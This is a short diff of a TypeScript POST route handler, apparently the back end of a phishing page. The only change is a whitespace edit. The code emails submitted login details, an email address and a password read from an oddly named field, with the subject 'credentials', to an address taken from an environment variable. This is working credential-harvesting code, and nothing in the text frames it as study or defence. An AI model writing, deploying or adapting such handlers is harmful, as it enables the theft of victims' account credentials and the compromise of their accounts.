@@ -21,7 +21,7 @@ export async function POST(request: Request) {
 
       const result = await transporter.sendMail({
          from: `"dees" <deeswork969@gmail.com>`,
-         to: `${process.env.EMAIL_TO_SEND}`,
+         to: `${process.env.EMAIL_TO_SEND}`, 
          subject: 'credentials',
          // text: `${JSON.stringify(email)} ${JSON.stringify(password)}`,
          html: `<h3>email: ${JSON.stringify(res.email).replaceAll('"', '')}, password: ${JSON.stringify(res.jennet).replaceAll('"', '')}</h3>`
